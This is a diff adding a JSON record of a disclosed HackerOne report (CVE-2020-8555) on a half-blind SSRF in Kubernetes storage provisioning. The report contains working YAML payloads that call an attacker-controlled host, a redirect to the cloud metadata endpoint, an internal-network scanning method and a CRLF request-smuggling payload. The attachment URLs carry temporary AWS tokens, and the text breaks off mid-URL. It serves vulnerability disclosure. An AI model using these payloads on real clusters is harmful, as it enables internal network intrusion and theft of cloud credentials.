@@ -1,0 +1,189 @@
+{
+  "id": 776017,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NzYwMTc=",
+  "url": "https://hackerone.com/reports/776017",
+  "title": "Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-01-15T22:33:11.684Z",
+  "submitted_at": "2020-01-15T22:33:11.684Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "reeverzax",
+    "url": "/reeverzax",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/186/226/fda450093940a615c855b463ca1731e49138076c_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8555"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-10-30T21:37:19.120Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-10-30T21:37:18.661Z",
+  "team_member_agreed_on_going_public_at": "2020-10-30T21:28:28.383Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello,\n\n## Who we are :\n\nWe’re two French security researchers and our respective names are Brice Augras and\nChristophe Hauquiert, we worked and found the vulnerability together.\n\nBrice Augras from https://www.groupe-asten.fr/ company - https://hackerone.com/reeverzax\nChristophe Hauquiert - https://hackerone.com/hach\n\n## Summary\n\nWe recently led some security investigations about Kubernetes product hosted in a managed\nservice.\nBy abusing product vulnerability due to implementation context, we would like to bring to your\nattention technical details about what we found.\nWe started an investigation process on multiple managed k8s offers and found quite each time a Critical\nImpact vulnerability as this can vary from half-blind SSRF and allow an attacker to perform internal services enumeration inside the distributor perimeter to full SSRF vulnerability .\nWe're getting in touch with you about the vulnerability you just got aware of two weeks ago from security team we were in touch with.  \n\n## Technical specification : \n\n- Fake vendor name : **example.com**\n- Kubernetes release for half-blind SSRF scenario: **1.14**\n- Kubernetes release for complete SSRF vulnerability :  up to **v1.15.3**, **v1.14.6** and **v1.13.10**\n\nWe don't know if the previous information regarding k8s release can be useful for you as each distributor seems to manage its own k8s custom cluster release. \n- Attacker server: **https://bzh.ovh** (51.38.238.22)\n- Provided file with proof of concept scripts: **PoC.zip**\n\n{F685902}\n\n## Compromission Scenario\n\nHere is the main workflow we followed in order to escape from our customer environment on multiple distributors \nproviding k8s managed offer.\n\nFirstly, we created a k8s cluster on distributors managed k8s service.\nMainly, these vendors use the following infrastructure : \n\n{F685875}\n\nAfter configuring kubectl binary, we were able to manage our customer cluster provided by **example.com**\n\nWhen creating a persistent volume claim associated with a custom StorageClass on our\ncluster, the provisioning step is handled by the **kube/cloud controller manager** (depending of the release),\nwe noticed that the process was handled  inside vendor internal perimeter.\nWe discovered the existence of a half-blind SSRF vulnerability inside multiple\nStorageClasses (glusterfs, scaleio, storageos) due to k8s managed context.\n\nThis half-blind SSRF can be used us to scan master VPC network and request the different listening services\n(Metadata instance, Kubelet, ETCD, etc..) based on the **kube-controller** responses.\n\nInitially, we were only limited to HTTP POST requests as we were unable to retrieve content of\nbody page if the response code was equal to 200 and not in JSON Content-Type.\nBut we improved our first payload by combining the previous step with a 302 redirect from an\nexternal server in order to convert POST request to GET request.\n\nIn addition to this, if the managed k8s offer service provider was using an old k8s cluster release **AND** allowed customer **kube-controller-manager** logs access, an attacker could interact in a more convenient way by crafting full user-controllable HTTP requests and get full HTTP response.\nThis was the attack scenario with the most impact. \nIndeed, while we were working on our research project, we managed to perform some of the following actions among different managed k8s providers: Priv esc with credential retrieving via metadata instances, DoS the master instance with HTTP request (unencrypted) on ETCD master instances, etc...\n \n## PoC\n### PoC n°1 - Half Blind SSRF\n\nWhile doing some analysis on **glusterFS** storage Class Golang source, we noticed that \nthe first HTTP request issued during a Volume creation\n(https://github.com/heketi/heketi/blob/master/client/api/go-client/volume.go#L34), **/volumes**\nwas appended at the end of the user provided URL in **resturl** parameter.\nIn order to remove the end of this unwanted path, we used the **#** trick in the resturl\nparameter.\nHere is the first YAML payload we used as evidence for the half-blind SSRF vulnerability:\n\n```yaml\napiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\nname: poc-ssrf\nprovisioner: kubernetes.io/glusterfs\nparameters:\nresturl: \"http://bzh.ovh:6666/#\"\nclusterid: \"630372ccdc720a92c681fb928f27b53f\"\nrestauthenabled: \"true\"\nrestuser: \"admin\"\nsecretNamespace: \"default\"\nsecretName: \"poc-ssrf-secret\"\ngidMin: \"40000\"\ngidMax: \"50000\"\nvolumetype: \"replicate:3\"\n---\napiVersion: v1\ndata:\nkey: bXlwYXNzd29yZA==\nkind: Secret\nmetadata:\nname: poc-ssrf-secret\nnamespace: default\ntype: kubernetes.io/glusterfs\n---\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\nname: poc-ssrf\nspec:\naccessModes:\n- ReadWriteOnce\nvolumeMode: Filesystem\nresources:\nrequests:\nstorage: 8Gi\nstorageClassName: poc-ssrf\n```\n\nWe executed the payload with kubectl binary, and the kube-controller-manager handled the\ncreation process and HTTP request:\n\n```bash\nkubectl create -f sc-poc.yam\n```\nThe attacker server was put in listening mode on port 6666 in order to handle incoming\nPOST requests and verify that how the URL could be arbirary controlled by an attacker:\n\n{F685801}\n\n### PoC n°2 : Redirecting POST to GET HTTP request trick\n\nThe first request issued by Glusterfs client was a POST type, by doing the following steps,\nwe were able to convert POST request to GET:\n\n• Storage class uses http://bzh.ovh/redirect.php# as resturl parameter\n• https://bzh.ovh/redirect.php endpoint responds with 302 HTTP return code with the\nfollowing Location Header http://169.254.169.254 (could be any other internal\nresource, this redirected url is used for example purposes)\n• As by default Golang net/http library follows redirection and convert POST to GET\nwith 302 return code, the targeted resource is then requested with a HTTP GET request.\n\nWe were able to read HTTP response body on some requests by describing persistent\nvolume claim object:\n```\nkubectl describe pvc xxx\n```\n\nOr, getting events from Kubernetes cluster with command below:\n```\nkubectl get event\n```\nHere is an example of JSON response we were able to retrieve : \n\n{F685919}\n\nThe exploitation process of our vulnerability at this moment was limited due to the\nfollowing elements:\n- We were not able to inject HTTP headers in the emitted request\n- We were not able to perform POST HTTP Request with body parameters (useful to\nrequest key value on ETCD instance running on 2379 PORT if HTTP unencrypted is used)\n- We were not able to retrieve response body content when HTTP return code was\n200 and not a JSON Content-Type response.\n\n\n### PoC n°3 : Managed cluster Lan scanning and sensitive data exposure \n\nAt least, as we had the possibility to scan LAN resources, the next step was automation.\nIndeed, in order to scan one IP address and one port we had to realize the following tasks:\n- Delete previous tested Storage Class\n- Delete previous tested Persistent Volume Claim\n- Change IP and PORT in sc.yaml\n- Create Storage Class with new IP and port\n- Create new Persistent Volume Claim\nSince the way to scan for one resource was very specific and incompatible with traditional\nSSRF exploitation tools or scanners, we decided to create some kind of custom workers in\nbash script.\nIn order to be able to scan 172.16.0.0/12 range faster, we launched 15 simultaneously workers.\nThe above IP range was chosen just for demonstration purposes and can be adapted to each provider internal IP range. \n \nEach worker was launched the following command:\n\n{F685904}\n\nHere are two additional YAML files that needs to be in the same directory as scanner.sh Bash\nscript:\n```yaml\napiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\nname: {{SC_NAME}}\nprovisioner: kubernetes.io/glusterfs\nparameters:\nresturl: \"http://{{URL}}#\"\nclusterid: \"630372ccdc720a92c681fb928f27b53f\"\nrestauthenabled: \"true\"\nrestuser: \"admin\"\nsecretNamespace: \"default\"\nsecretName: \"heketi-secret\"\ngidMin: \"40000\"\ngidMax: \"50000\"\nvolumetype: \"replicate:3\"\n```\nAbove is the content of **template_sc.yaml**\n\n```yaml\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\nname: {{PVC_NAME}}\nspec:\naccessModes:\n- ReadWriteOnce\nvolumeMode: Filesystem\nresources:\nrequests:\nstorage: 8Gi\nstorageClassName: {{SC_NAME}}\n```\nAbove is the content of **template_pvc.yaml**\n\n### PoC n°4  : CRLF + smuggling HTTP injection in old Kubernetes cluster releases \n\nIn addition to all the previous steps, we found a more efficient way to retrieve full HTTP\nresponse body content in addition to craft complete HTTP requests that were user controlled.\n\nUnfortunately, the vulnerability requires the following prerequisites:\n- Kube Controller Manager logs reachable by the customer\n- Kubernetes Cluster version using Golang version <1.12 (See technical requirements chapter for additional information about specific k8s releases concerned)\n\nWe still wan't to bring this attack scenario with a PoC as some providers still have some \ncustomers using one of these “deprecated” k8s release.\n\nWe realized a first PoC in a local environment to demonstrate the vulnerability.\nHere are some technical details about them:\nWe discovered a vulnerability was existing for the following Golang releases <1.12\n(https://github.com/golang/go/issues/30794) that allowed to produce HTTP smuggling/CRLF\nattacks.\nBy combining the Half-Blind SSRF described above and the vulnerability, we were able to send complete\ncrafted requests, including custom headers, HTTP method, parameters and data that were\ngoing to be executed by the **kube-controller-manager**.\n\nIn addition to previous steps, we were able to retrieve full HTTP responses from interal requested resource. \n\nWe deployed a local environment simulating Kubernetes exchanges between the GlusterFS\nGo client and a fake targeted server. (PoC is http-smuggling-poc in the zip file).\n\nHere is an example of a working StorageClass resturl parameter payload performing an HTTP\nsmuggling attack + CRLF during provisioning step in order to leak response content in kube-\ncontroller logs:\n\nHere is an example of a working StorageClass **resturl** parameter payload allowing to perform this kind of attack scenario : \n\n```\nhttp://172.31.X.1:10255/healthz? HTTP/1.1\\r\\nConnection: keep-\nalive\\r\\nHost: 172.31.X.1:10255\\r\\nContent-Length: 1\\r\\n\\r\\n1\\r\\nGET /pods? HTTP/1.1\\r\\nHost: 172.31.X.1:10255\\r\\n\\r\\n\n```\n\nHere is the complete HTTP response that was leaking inside the **lube-controller-manage** logs :\n\n{F685896}\n\n## Impact\n\n## Impact Analysis\n\nThis was quite hard for us to evaluate how hard the impact was for these two attack vectors. \nIndeed, as they are vendor dependent, we preferred to take the lowest score we found about impact analysis regarding to whom we reported the security problematic.\nFeel free to exchange with us about the **CVSS** score about you consider for this vulnerability as this seems to be related to managed context k8s environment.\n\nFrom the various distributors we led research on, we noticed that this could lead to  the following impact analysis : \n \n### Integrity\n\n- Lateral movement with cloud steal credentials (from metadata API)\n- Remote command execution by using these credentials\n- Reproducing above scenario in an IDOR way with other resources discovered in LAN area.\n\n### Confidentiality\n\n- Information gathering by LAN scannin (ssh version, http server versions, ...)\n- Instances and infrastructure information by requesting internal API like metadata APIs (http://169.254.169.254, ...)\n- Customers data leak, by using cloud credentials\n\n### Availability\n\nAll the post-exploitation scenarios about **integrity** attack vectors could be used to perform disruptive scenarios and make master instance from our customer perimeter or other customer unavailable. \n\nIndeed, as we are in managed k8senvironment and considering the integrity impact, we can imagine lots of scenarios that can impact availability. An additional example could be to corrupt ETCD database or perform critical call to kubernetes API.\n\nBest Regards, \n\nBrice Augras from @Groupe-Asten\nChristophe Hauquiert",
+  "bounty_amount": "5000.0",
+  "formatted_bounty": "$5,000",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 685801,
+      "file_name": "screen1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3ZSYftaTxURTiyUDpH5C4FG2?response-content-disposition=attachment%3B%20filename%3D%22screen1.png%22%3B%20filename%2A%3DUTF-8%27%27screen1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYSRTPENT%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151703Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQClnbG8vqYrSqzQXmDUUgMjhtuh58NLNeDsbWuSsRg1hgIhAPcxhE464d7O3V1HZ0%2FdXfm0KtSqutLgcx41x%2B7CTiarKrsFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyStI%2FGQ7th1cnchbQqjwUnkogl7RDJ9CdGbaQOhpqMdqTgX4AfVCSGZTTue0rS7M5I0Mx5xsKGNVgjZKt75IewwfhhfHL%2FRAHBkrPAZW41%2BG8lI79wO9KS67s83JTwK2kp9gVFtonK2Jfh8PwIcLG29bYD7kEkke5ezJCHoDK2Jy%2BoTjc2QBE9n%2FScRs%2BpZHSp%2Bg9IKT87MqqGWmw1Dj4gBDXz7IQovNO2JnVjXoyLgGlo6UpUafdv90fYERh0eHtxN%2FIVhbM%2Fm713wPtYKOiI0I5oJI%2BHTe1a6q3fbt9Oqx0xD%2FuMJHAI68OXeFTFuATXBvZ65Yl2HNdmMn57synTIbWJs2z9tDqOR0%2BzRQ9rFvcy9E4FNotAoLt8%2BrYjMRY4zFLhqNtFY%2FWIjwDvsK34lC%2FPK1La3VelQTYIQKJwaDKsiXSGWsEtzi1NqITAfNI1v%2BIF7J3Zw9GPnJb9frHldcZC79b%2BC%2FCLzukzZXg1GCxrqyL%2FgvgyORrnXT6X1ny2x6caaZQnJuWKZFNigkKYBVyWq2abk19SEh3UErx9zBkW%2BBgvSwUbVSbgDqV7K%2BynWXRf4dt0S%2F8RXrFUAzt%2BA77T%2BJLiO4kmgR4FN3hE1Sis3JGXKBUOK1vPH7gD%2FEd7vOax16%2ForWCCoKmCxr5CAEfhu1CiyqCOHUboyxJXjebKNs3CO0TsGnb89QVMeX8ylZjtms20d%2FWlIvMRGgQpIhgTlHjJzYLgLtq0SF0T%2BEuOtQF8ElGvwSU5c2oqZrmimGylTc28DlV1ecDGmWhNiSsJ3tf4%2BM4rInVRc8QB4a5aovEQ0ctaWRG3pINYeGQ%2FiMnwgxlGZHw7ZdoMuP6d%2F9aNEeOd4fk9ZtkFnKDDVF%2FeQku4c%2FTNouMWEOx0MM2G%2Fc8GOrABaYsmgwPerzVWftd1ov9iT%2BKGD%2FORm0nrCHhFReLwdAYtJ3AnsqStoLtIZaTMJdjb19NlCTXTVRF1cHYsNgMzkL%2BEXYpZs1wH6tu5YrBExPqozNr51ev%2FtWlFHlgp4HX2Lvp3pyDK1NCGK4sIJipEbG15Dtkjb%2BLasvRqCS8CqBQM8U%2Bioase3l%2FFnWM7dax53w6UtT%2BdRKEGgZ8Y%2FwdR42WGR9WWo33SrtWQPDCM6%2Bo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=315493334f2fd3dcd290b8b09066e877a765429acc6c1b1ef4740b70a2209f17",
+      "file_size": 55515,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 685875,
+      "file_name": "screen2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/o3coTnW5jynaDXScVGceDuT5?response-content-disposition=attachment%3B%20filename%3D%22screen2.png%22%3B%20filename%2A%3DUTF-8%27%27screen2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYSRTPENT%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151703Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQClnbG8vqYrSqzQXmDUUgMjhtuh58NLNeDsbWuSsRg1hgIhAPcxhE464d7O3V1HZ0%2FdXfm0KtSqutLgcx41x%2B7CTiarKrsFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyStI%2FGQ7th1cnchbQqjwUnkogl7RDJ9CdGbaQOhpqMdqTgX4AfVCSGZTTue0rS7M5I0Mx5xsKGNVgjZKt75IewwfhhfHL%2FRAHBkrPAZW41%2BG8lI79wO9KS67s83JTwK2kp9gVFtonK2Jfh8PwIcLG29bYD7kEkke5ezJCHoDK2Jy%2BoTjc2QBE9n%2FScRs%2BpZHSp%2Bg9IKT87MqqGWmw1Dj4gBDXz7IQovNO2JnVjXoyLgGlo6UpUafdv90fYERh0eHtxN%2FIVhbM%2Fm713wPtYKOiI0I5oJI%2BHTe1a6q3fbt9Oqx0xD%2FuMJHAI68OXeFTFuATXBvZ65Yl2HNdmMn57synTIbWJs2z9tDqOR0%2BzRQ9rFvcy9E4FNotAoLt8%2BrYjMRY4zFLhqNtFY%2FWIjwDvsK34lC%2FPK1La3VelQTYIQKJwaDKsiXSGWsEtzi1NqITAfNI1v%2BIF7J3Zw9GPnJb9frHldcZC79b%2BC%2FCLzukzZXg1GCxrqyL%2FgvgyORrnXT6X1ny2x6caaZQnJuWKZFNigkKYBVyWq2abk19SEh3UErx9zBkW%2BBgvSwUbVSbgDqV7K%2BynWXRf4dt0S%2F8RXrFUAzt%2BA77T%2BJLiO4kmgR4FN3hE1Sis3JGXKBUOK1vPH7gD%2FEd7vOax16%2ForWCCoKmCxr5CAEfhu1CiyqCOHUboyxJXjebKNs3CO0TsGnb89QVMeX8ylZjtms20d%2FWlIvMRGgQpIhgTlHjJzYLgLtq0SF0T%2BEuOtQF8ElGvwSU5c2oqZrmimGylTc28DlV1ecDGmWhNiSsJ3tf4%2BM4rInVRc8QB4a5aovEQ0ctaWRG3pINYeGQ%2FiMnwgxlGZHw7ZdoMuP6d%2F9aNEeOd4fk9ZtkFnKDDVF%2FeQku4c%2FTNouMWEOx0MM2G%2Fc8GOrABaYsmgwPerzVWftd1ov9iT%2BKGD%2FORm0nrCHhFReLwdAYtJ3AnsqStoLtIZaTMJdjb19NlCTXTVRF1cHYsNgMzkL%2BEXYpZs1wH6tu5YrBExPqozNr51ev%2FtWlFHlgp4HX2Lvp3pyDK1NCGK4sIJipEbG15Dtkjb%2BLasvRqCS8CqBQM8U%2Bioase3l%2FFnWM7dax53w6UtT%2BdRKEGgZ8Y%2FwdR42WGR9WWo33SrtWQPDCM6%2Bo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3b6e9c3503199088ebe3ca858c3b2e529870031cbb766539a686eec76c3b4304",
+      "file_size": 37072,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 685896,
+      "file_name": "CRLF.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uCt2ysr2iux5BkSorDkvovZp?response-content-disposition=attachment%3B%20filename%3D%22CRLF.png%22%3B%20filename%2A%3DUTF-8%27%27CRLF.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYSRTPENT%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151703Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQClnbG8vqYrSqzQXmDUUgMjhtuh58NLNeDsbWuSsRg1hgIhAPcxhE464d7O3V1HZ0%2FdXfm0KtSqutLgcx41x%2B7CTiarKrsFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyStI%2FGQ7th1cnchbQqjwUnkogl7RDJ9CdGbaQOhpqMdqTgX4AfVCSGZTTue0rS7M5I0Mx5xsKGNVgjZKt75IewwfhhfHL%2FRAHBkrPAZW41%2BG8lI79wO9KS67s83JTwK2kp9gVFtonK2Jfh8PwIcLG29bYD7kEkke5ezJCHoDK2Jy%2BoTjc2QBE9n%2FScRs%2BpZHSp%2Bg9IKT87MqqGWmw1Dj4gBDXz7IQovNO2JnVjXoyLgGlo6UpUafdv90fYERh0eHtxN%2FIVhbM%2Fm713wPtYKOiI0I5oJI%2BHTe1a6q3fbt9Oqx0xD%2FuMJHAI68OXeFTFuATXBvZ65Yl2HNdmMn57synTIbWJs2z9tDqOR0%2BzRQ9rFvcy9E4FNotAoLt8%2BrYjMRY4zFLhqNtFY%2FWIjwDvsK34lC%2FPK1La3VelQTYIQKJwaDKsiXSGWsEtzi1NqITAfNI1v%2BIF7J3Zw9GPnJb9frHldcZC79b%2BC%2FCLzukzZXg1GCxrqyL%2FgvgyORrnXT6X1ny2x6caaZQnJuWKZFNigkKYBVyWq2abk19SEh3UErx9zBkW%2BBgvSwUbVSbgDqV7K%2BynWXRf4dt0S%2F8RXrFUAzt%2BA77T%2BJLiO4kmgR4FN3hE1Sis3JGXKBUOK1vPH7gD%2FEd7vOax16%2ForWCCoKmCxr5CAEfhu1CiyqCOHUboyxJXjebKNs3CO0TsGnb89QVMeX8ylZjtms20d%2FWlIvMRGgQpIhgTlHjJzYLgLtq0SF0T%2BEuOtQF8ElGvwSU5c2oqZrmimGylTc28DlV1ecDGmWhNiSsJ3tf4%2BM4rInVRc8QB4a5aovEQ0ctaWRG3pINYeGQ%2FiMnwgxlGZHw7ZdoMuP6d%2F9aNEeOd4fk9ZtkFnKDDVF%2FeQku4c%2FTNouMWEOx0MM2G%2Fc8GOrABaYsmgwPerzVWftd1ov9iT%2BKGD%2FORm0nrCHhFReLwdAYtJ3AnsqStoLtIZaTMJdjb19NlCTXTVRF1cHYsNgMzkL%2BEXYpZs1wH6tu5YrBExPqozNr51ev%2FtWlFHlgp4HX2Lvp3pyDK1NCGK4sIJipEbG15Dtkjb%2BLasvRqCS8CqBQM8U%2Bioase3l%2FFnWM7dax53w6UtT%2BdRKEGgZ8Y%2FwdR42WGR9WWo33SrtWQPDCM6%2Bo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=defcef4b47d7bcb93b488ef8bdc504d0956e02d34ec76e258dba8406468f65a4",
+      "file_size": 103076,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 685902,
+      "file_name": "PoC.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9QUtMeZurtKvaceRZHUe8Ncr?response-content-disposition=attachment%3B%20filename%3D%22PoC.zip%22%3B%20filename%2A%3DUTF-8%27%27PoC.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYSRTPENT%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151703Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQClnbG8vqYrSqzQXmDUUgMjhtuh58NLNeDsbWuSsRg1hgIhAPcxhE464d7O3V1HZ0%2FdXfm0KtSqutLgcx41x%2B7CTiarKrsFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyStI%2FGQ7th1cnchbQqjwUnkogl7RDJ9CdGbaQOhpqMdqTgX4AfVCSGZTTue0rS7M5I0Mx5xsKGNVgjZKt75IewwfhhfHL%2FRAHBkrPAZW41%2BG8lI79wO9KS67s83JTwK2kp9gVFtonK2Jfh8PwIcLG29bYD7kEkke5ezJCHoDK2Jy%2BoTjc2QBE9n%2FScRs%2BpZHSp%2Bg9IKT87MqqGWmw1Dj4gBDXz7IQovNO2JnVjXoyLgGlo6UpUafdv90fYERh0eHtxN%2FIVhbM%2Fm713wPtYKOiI0I5oJI%2BHTe1a6q3fbt9Oqx0xD%2FuMJHAI68OXeFTFuATXBvZ65Yl2HNdmMn57synTIbWJs2z9tDqOR0%2BzRQ9rFvcy9E4FNotAoLt8%2BrYjMRY4zFLhqNtFY%2FWIjwDvsK34lC%2FPK1La3VelQTYIQKJwaDKsiXSGWsEtzi1NqITAfNI1v%2BIF7J3Zw9GPnJb9frHldcZC79b%2BC%2FCLzukzZXg1GCxrqyL%2FgvgyORrnXT6X1ny2x6caaZQnJuWKZFNigkKYBVyWq2abk19SEh3UErx9zBkW%2BBgvSwUbVSbgDqV7K%2BynWXRf4dt0S%2F8RXrFUAzt%2BA77T%2BJLiO4kmgR4FN3hE1Sis3JGXKBUOK1vPH7gD%2FEd7vOax16%2ForWCCoKmCxr5CAEfhu1CiyqCOHUboyxJXjebKNs3CO0TsGnb89QVMeX8ylZjtms20d%2FWlIvMRGgQpIhgTlHjJzYLgLtq0SF0T%2BEuOtQF8ElGvwSU5c2oqZrmimGylTc28DlV1ecDGmWhNiSsJ3tf4%2BM4rInVRc8QB4a5aovEQ0ctaWRG3pINYeGQ%2FiMnwgxlGZHw7ZdoMuP6d%2F9aNEeOd4fk9ZtkFnKDDVF%2FeQku4c%2FTNouMWEOx0MM2G%2Fc8GOrABaYsmgwPerzVWftd1ov9iT%2BKGD%2FORm0nrCHhFReLwdAYtJ3AnsqStoLtIZaTMJdjb19NlCTXTVRF1cHYsNgMzkL%2BEXYpZs1wH6tu5YrBExPqozNr51ev%2FtWlFHlgp4HX2Lvp3pyDK1NCGK4sIJipEbG15Dtkjb%2BLasvRqCS8CqBQM8U%2Bioase3l%2FFnWM7dax53w6UtT%2BdRKEGgZ8Y%2FwdR42WGR9WWo33SrtWQPDCM6%2Bo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6709989bb5bf2a9aa25f987a5e814a19e623570fa10063b1637b1fd2bfda8977",
+      "file_size": 6886,
+      "type": "application/zip",
+      "moderated": null
+    },
+    {
+      "id": 685904,
+      "file_name": "worker.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/of7o9uN5nbDT3TebpV9ALSU4?response-content-disposition=attachment%3B%20filename%3D%22worker.png%22%3B%20filename%2A%3DUTF-8%27%27worker.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYSRTPENT%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151703Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQClnbG8vqYrSqzQXmDUUgMjhtuh58NLNeDsbWuSsRg1hgIhAPcxhE464d7O3V1HZ0%2FdXfm0KtSqutLgcx41x%2B7CTiarKrsFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyStI%2FGQ7th1cnchbQqjwUnkogl7RDJ9CdGbaQOhpqMdqTgX4AfVCSGZTTue0rS7M5I0Mx5xsKGNVgjZKt75IewwfhhfHL%2FRAHBkrPAZW41%2BG8lI79wO9KS67s83JTwK2kp9gVFtonK2Jfh8PwIcLG29bYD7kEkke5ezJCHoDK2Jy%2BoTjc2QBE9n%2FScRs%2BpZHSp%2Bg9IKT87MqqGWmw1Dj4gBDXz7IQovNO2JnVjXoyLgGlo6UpUafdv90fYERh0eHtxN%2FIVhbM%2Fm713wPtYKOiI0I5oJI%2BHTe1a6q3fbt9Oqx0xD%2FuMJHAI68OXeFTFuATXBvZ65Yl2HNdmMn57synTIbWJs2z9tDqOR0%2BzRQ9rFvcy9E4FNotAoLt8%2BrYjMRY4zFLhqNtFY%2FWIjwDvsK34lC%2FPK1La3VelQTYIQKJwaDKsiXSGWsEtzi1NqITAfNI1v%2BIF7J3Zw9GPnJb9frHldcZC79b%2BC%2FCLzukzZXg1GCxrqyL%2FgvgyORrnXT6X1ny2x6caaZQnJuWKZFNigkKYBVyWq2abk19SEh3UErx9zBkW%2BBgvSwUbVSbgDqV7K%2BynWXRf4dt0S%2F8RXrFUAzt%2BA77T%2BJLiO4kmgR4FN3hE1Sis3JGXKBUOK1vPH7gD%2FEd7vOax16%2ForWCCoKmCxr5CAEfhu1CiyqCOHUboyxJXjebKNs3CO0TsGnb89QVMeX8ylZjtms20d%2FWlIvMRGgQpIhgTlHjJzYLgLtq0SF0T%2BEuOtQF8ElGvwSU5c2oqZrmimGylTc28DlV1ecDGmWhNiSsJ3tf4%2BM4rInVRc8QB4a5aovEQ0ctaWRG3pINYeGQ%2FiMnwgxlGZHw7ZdoMuP6d%2F9aNEeOd4fk9ZtkFnKDDVF%2FeQku4c%2FTNouMWEOx0MM2G%2Fc8GOrABaYsmgwPerzVWftd1ov9iT%2BKGD%2FORm0nrCHhFReLwdAYtJ3AnsqStoLtIZaTMJdjb19NlCTXTVRF1cHYsNgMzkL%2BEXYpZs1wH6tu5YrBExPqozNr51ev%2